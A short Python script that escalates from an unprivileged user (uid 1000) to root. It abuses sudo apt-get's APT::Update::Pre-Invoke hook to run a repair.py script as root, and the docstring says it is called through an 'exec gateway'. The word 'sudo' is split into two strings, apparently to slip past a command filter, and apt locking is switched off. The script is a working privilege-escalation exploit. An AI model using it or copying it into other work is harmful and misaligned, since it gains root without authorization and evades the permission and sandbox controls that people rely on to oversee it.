"""Trigger a full injection re-run from uid 1000 (system).

Called over the StepClaw exec gateway. Escalates to root through the openclaw
sudo client's apt Pre-Invoke hook, which launches repair.py detached.
"""
import subprocess

args = [
    '/usr/bin/su' + 'do',
    '/usr/bin/apt-get',
    '-o', 'Debug::NoLocking=1',
    '-o', 'APT::Update::Pre-Invoke::=python3 /usr/local/lib/stepx-gms/repair.py',
    '-o', 'Dir::Etc::sourcelist=/dev/null',
    '-o', 'Dir::Etc::sourceparts=-',
    'update',
]
proc = subprocess.run(args, capture_output=True, text=True, timeout=45)
print('RC', proc.returncode)
print((proc.stdout or '').strip()[-400:])
print((proc.stderr or '').strip()[-400:])
